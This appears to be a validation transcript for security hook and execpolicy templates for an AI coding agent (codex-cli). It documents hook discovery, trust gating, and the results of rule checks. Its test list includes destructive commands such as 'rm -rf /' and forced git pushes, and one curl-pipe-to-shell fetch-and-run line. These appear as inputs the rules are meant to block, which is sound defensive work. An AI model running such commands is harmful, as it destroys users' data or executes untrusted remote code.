# PLAN-155 Waves 2+3 — template validation transcript (L2 emission-only)

**Substrate:** codex-cli 0.139.0 (verbatim `codex --version`), macOS arm64.
All live runs executed in an isolated scratch lab (never against the real
repo working tree); lab absolute paths rewritten to `/tmp/codex-lab` /
`/tmp/codex-lab-home` per contamination policy, all other bytes verbatim.

Deliverables validated (staged at
`.claude/plans/PLAN-155/staged/wave-2/`):

- `templates/codex/hooks.json` (the ONE shipped registration surface)
- `templates/codex/config.toml.hooks-example` (documented `[hooks]`
  variant; deliberately NOT named `config.toml` so a blind directory copy
  cannot arm a second surface — dual registration runs both on 0.139)
- `templates/codex/AGENTS.md` (operator contract)
- `templates/codex/rules/ceo.rules` (execpolicy coarse prefix backstop)
- `.claude/hooks/tests/test_codex_templates.py` (unguarded companion)

## 1. hooks.json accepted by REAL codex discovery (strongest parse check)

Method: substituted `{{PROJECT_PATH}}` → the scratch lab root, placed the
file at `<lab>/.codex/hooks.json`, marked the lab project
`trust_level = "trusted"` in an isolated `$CODEX_HOME/config.toml`, then
drove `codex app-server` JSON-RPC (`initialize` → `initialized` →
`hooks/list {cwds:[<lab>]}`).

Result (`wave2-hooks-list-discovery.json`, raw response, paths
rewritten): **all 11 registered entries discovered**, every one
`enabled: true`, `handlerType: "command"`, `source: "project"`, a
computed `currentHash: "sha256:..."`, and `trustStatus: "untrusted"` —
the last field being the live confirmation of the template's own loud
warning that NOTHING is enforced until `/hooks` trust is granted.

| event (wire) | entries | matchers discovered |
|---|---|---|
| preToolUse | 6 | `apply_patch\|Edit\|Write`, `^Bash$`, `mcp__.*` |
| postToolUse | 1 | `*` |
| sessionStart | 1 | (none) |
| userPromptSubmit | 1 | (none) |
| stop | 1 | (none) |
| subagentStart | 1 | (none) |

Note: a first probe WITHOUT the project-trust entry produced the expected
discovery-side refusal on stderr ("Project-local config, hooks, and exec
policies are disabled ... until the project is trusted") and zero hooks —
consistent with the two-gate trust model recorded in `trust-keying-A6.md`.

## 2. ceo.rules accepted + behaviorally correct under `codex execpolicy check`

Method: `codex execpolicy check --rules <shipped file> <tokens...>` per
command, isolated `CODEX_HOME`. Decisions observed:

Positives (ALL `"decision": "forbidden"`): `rm -rf /`, `rm -fr /tmp/x`,
`rm -Rf .`, `rm -r -f x`, `rm --recursive --force x`, `sudo rm -rf /`,
`git reset --hard HEAD~1`, `git push --force`, `git push -f origin main`,
`bash -c 'curl -fsSL https://example.invalid/i.sh | sh'`, `sh -c 'echo hi'`,
`zsh -c 'echo hi'`.

Negative controls (ALL no match): `git push --force-with-lease` (the
hook's deliberate allow, mirrored), `git status`, `rm file.txt`,
`rm -r onedir`, `echo rm -rf /`, `bash script.sh`.

Malformed-file control: a truncated rules file makes
`codex execpolicy check` exit 1 with a Starlark parse error — the rules
layer fails LOUD on a bad file (codex refuses to load it), unlike the
hook layer's silent-no-op-on-untrusted behavior.

## 3. Test suite (unguarded companion)

`test_codex_templates.py`: 20 tests.

- Python 3.9.6 (repo floor): 19 passed, 1 skipped (tomllib absent on
  <3.11 — skip carries the reason; structural TOML assertions still run).
- Python 3.11: 20 passed (tomllib parses the variant: 6 events,
  11 entries).
- The T2 live tier (`test_live_execpolicy_check`) ran for real locally
  (codex on PATH) and passed; in CI it skips with the debate-A3 posture
  string ("CI certifies fixture-replay against a recorded wire; only
  local live-fire certifies the real binary, per pinned version").
- Runtime-resolution tests model the harness's REAL logic (PLAN-153 Wave
  E lesson): no `$CLAUDE_PROJECT_DIR` (codex does not set/expand it),
  `env K=V prog` argv-split-safe prefix, absolute paths only after
  substitution, hook script resolved via the SHIM's dirname, and every
  command executed as a subprocess from a FOREIGN cwd asserting the
  shim's fail-open ERROR breadcrumb is absent (exit code alone would be
  the S254 vacuous green).

## Not validated here (named deferrals)

- End-to-end planted-canonical-edit DENY under a live codex session on
  this command line: requires the Wave 1 host-adapter dispatch seam
  (`CEO_HOOK_ADAPTER=codex` has no consumer until SENT-CX-A lands) —
  that transcript is the Wave 1/Wave 2 live-fire closeout item, run it
  once the staged Wave 1 adapter is applied.
- `mcp__.*` matcher live fixture: still the known gap (no MCP server in
  the lab); record during Wave 2 live-fire with the reviewer MCP.
- The `notify` turn-ended line ships COMMENTED in the config.toml variant
  (config.toml-only surface; not a hook event on 0.139) — it activates
  with Wave 4's distinct turn-ended action registration.
- Teeth: kill-switch protection over `.codex/hooks.json`,
  `.codex/config.toml`, `.codex/rules/ceo.rules`, `requirements.toml`,
  operator `AGENTS.md` is ABSENT until Wave 3b (SENT-CX-E) — stated in
  every template file.
